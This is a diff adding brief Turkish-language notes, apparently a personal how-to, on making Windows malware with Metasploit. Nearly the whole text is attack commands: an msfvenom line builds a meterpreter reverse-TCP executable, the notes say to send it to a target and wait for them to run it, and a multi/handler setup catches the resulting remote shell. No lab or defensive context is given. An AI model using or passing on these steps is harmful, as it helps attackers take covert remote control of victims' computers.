@@ -1,0 +1,15 @@
+msfconsole
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=kendi ip adresimiz LPORT=443 -f exe > deneme.exe
+
+**->Oluşturulan virüsün adı deneme ve uzantısı exe'dir.Burdan sonra karşı tarafa atılan
+virüsün çalıştırılması beklenir ve aşağıda ki komutlar yazılır.<-**
+
+msfconsole
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST bizim ip adresimiz yazılır
+set LPORT 443
+run
+
+**->Karşı taraf virüsü çalıştırdığında bildirim gelir ve help komutuyla erişebildiğimiz işlemleri 
+görebiliriz..<-**
